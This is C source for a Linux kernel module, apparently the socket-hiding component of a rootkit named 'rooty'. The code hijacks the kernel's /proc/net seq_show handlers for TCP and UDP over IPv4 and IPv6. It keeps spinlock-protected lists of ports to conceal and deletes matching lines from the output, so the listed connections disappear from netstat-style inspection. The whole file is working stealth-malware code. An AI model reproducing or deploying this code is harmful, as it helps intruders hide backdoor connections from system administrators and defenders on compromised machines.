#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/spinlock.h>
#include <linux/seq_file.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/err.h>
#include <net/tcp.h>
#include <net/udp.h>

#include "../include/syscall_table.h"
#include "../include/socket_hide.h"
#include "../common/rooty_uapi.h"

LIST_HEAD(hidden_tcp4_ports);
LIST_HEAD(hidden_tcp6_ports);
LIST_HEAD(hidden_udp4_ports);
LIST_HEAD(hidden_udp6_ports);

static DEFINE_SPINLOCK(hidden_tcp4_lock);
static DEFINE_SPINLOCK(hidden_tcp6_lock);
static DEFINE_SPINLOCK(hidden_udp4_lock);
static DEFINE_SPINLOCK(hidden_udp6_lock);

int (*tcp4_seq_show)(struct seq_file *seq, void *v);
int (*tcp6_seq_show)(struct seq_file *seq, void *v);
int (*udp4_seq_show)(struct seq_file *seq, void *v);
int (*udp6_seq_show)(struct seq_file *seq, void *v);

void *get_tcp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if (IS_ERR(filep = filp_open(path, O_RDONLY, 0)))
        return NULL;

    afinfo = PDE(filep->f_dentry->d_inode)->data;
    ret = afinfo->seq_ops.show;
    filp_close(filep, 0);

    return ret;
}

void *get_udp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct udp_seq_afinfo *afinfo;

    if (IS_ERR(filep = filp_open(path, O_RDONLY, 0)))
        return NULL;

    afinfo = PDE(filep->f_dentry->d_inode)->data;
    ret = afinfo->seq_ops.show;
    filp_close(filep, 0);

    return ret;
}

void hide_tcp4_port(unsigned short port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;
    hp->port = port;

    spin_lock(&hidden_tcp4_lock);
    list_add(&hp->list, &hidden_tcp4_ports);
    spin_unlock(&hidden_tcp4_lock);
}

void unhide_tcp4_port(unsigned short port)
{
    struct hidden_port *hp;

    spin_lock(&hidden_tcp4_lock);
    list_for_each_entry(hp, &hidden_tcp4_ports, list) {
        if (port == hp->port) {
            list_del(&hp->list);
            kfree(hp);
            spin_unlock(&hidden_tcp4_lock);
            return;
        }
    }
    spin_unlock(&hidden_tcp4_lock);
}

void hide_tcp6_port(unsigned short port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;
    hp->port = port;

    spin_lock(&hidden_tcp6_lock);
    list_add(&hp->list, &hidden_tcp6_ports);
    spin_unlock(&hidden_tcp6_lock);
}

void unhide_tcp6_port(unsigned short port)
{
    struct hidden_port *hp;

    spin_lock(&hidden_tcp6_lock);
    list_for_each_entry(hp, &hidden_tcp6_ports, list) {
        if (port == hp->port) {
            list_del(&hp->list);
            kfree(hp);
            spin_unlock(&hidden_tcp6_lock);
            return;
        }
    }
    spin_unlock(&hidden_tcp6_lock);
}

void hide_udp4_port(unsigned short port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;
    hp->port = port;

    spin_lock(&hidden_udp4_lock);
    list_add(&hp->list, &hidden_udp4_ports);
    spin_unlock(&hidden_udp4_lock);
}

void unhide_udp4_port(unsigned short port)
{
    struct hidden_port *hp;

    spin_lock(&hidden_udp4_lock);
    list_for_each_entry(hp, &hidden_udp4_ports, list) {
        if (port == hp->port) {
            list_del(&hp->list);
            kfree(hp);
            spin_unlock(&hidden_udp4_lock);
            return;
        }
    }
    spin_unlock(&hidden_udp4_lock);
}

void hide_udp6_port(unsigned short port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;
    hp->port = port;

    spin_lock(&hidden_udp6_lock);
    list_add(&hp->list, &hidden_udp6_ports);
    spin_unlock(&hidden_udp6_lock);
}

void unhide_udp6_port(unsigned short port)
{
    struct hidden_port *hp;

    spin_lock(&hidden_udp6_lock);
    list_for_each_entry(hp, &hidden_udp6_ports, list) {
        if (port == hp->port) {
            list_del(&hp->list);
            kfree(hp);
            spin_unlock(&hidden_udp6_lock);
            return;
        }
    }
    spin_unlock(&hidden_udp6_lock);
}

int n_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    hijack_resume(tcp4_seq_show);

    if (seq->count < TMPSZ)
        return ret;

    spin_lock(&hidden_tcp4_lock);
    list_for_each_entry(hp, &hidden_tcp4_ports, list) {
        sprintf(port, ":%04X", hp->port);
        if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ)) {
            seq->count -= TMPSZ;
            spin_unlock(&hidden_tcp4_lock);
            return ret;
        }
    }
    spin_unlock(&hidden_tcp4_lock);

    return ret;
}

int n_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp6_seq_show);
    ret = tcp6_seq_show(seq, v);
    hijack_resume(tcp6_seq_show);

    if (seq->count < TMPSZ)
        return ret;

    spin_lock(&hidden_tcp6_lock);
    list_for_each_entry(hp, &hidden_tcp6_ports, list) {
        sprintf(port, ":%04X", hp->port);
        if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ)) {
            seq->count -= TMPSZ;
            spin_unlock(&hidden_tcp6_lock);
            return ret;
        }
    }
    spin_unlock(&hidden_tcp6_lock);

    return ret;
}

int n_udp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(udp4_seq_show);
    ret = udp4_seq_show(seq, v);
    hijack_resume(udp4_seq_show);

    if (seq->count < TMPSZ)
        return ret;

    spin_lock(&hidden_udp4_lock);
    list_for_each_entry(hp, &hidden_udp4_ports, list) {
        sprintf(port, ":%04X", hp->port);
        if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ)) {
            seq->count -= TMPSZ;
            spin_unlock(&hidden_udp4_lock);
            return ret;
        }
    }
    spin_unlock(&hidden_udp4_lock);

    return ret;
}

int n_udp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(udp6_seq_show);
    ret = udp6_seq_show(seq, v);
    hijack_resume(udp6_seq_show);

    if (seq->count < TMPSZ)
        return ret;

    spin_lock(&hidden_udp6_lock);
    list_for_each_entry(hp, &hidden_udp6_ports, list) {
        sprintf(port, ":%04X", hp->port);
        if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ)) {
            seq->count -= TMPSZ;
            spin_unlock(&hidden_udp6_lock);
            return ret;
        }
    }
    spin_unlock(&hidden_udp6_lock);

    return ret;
}
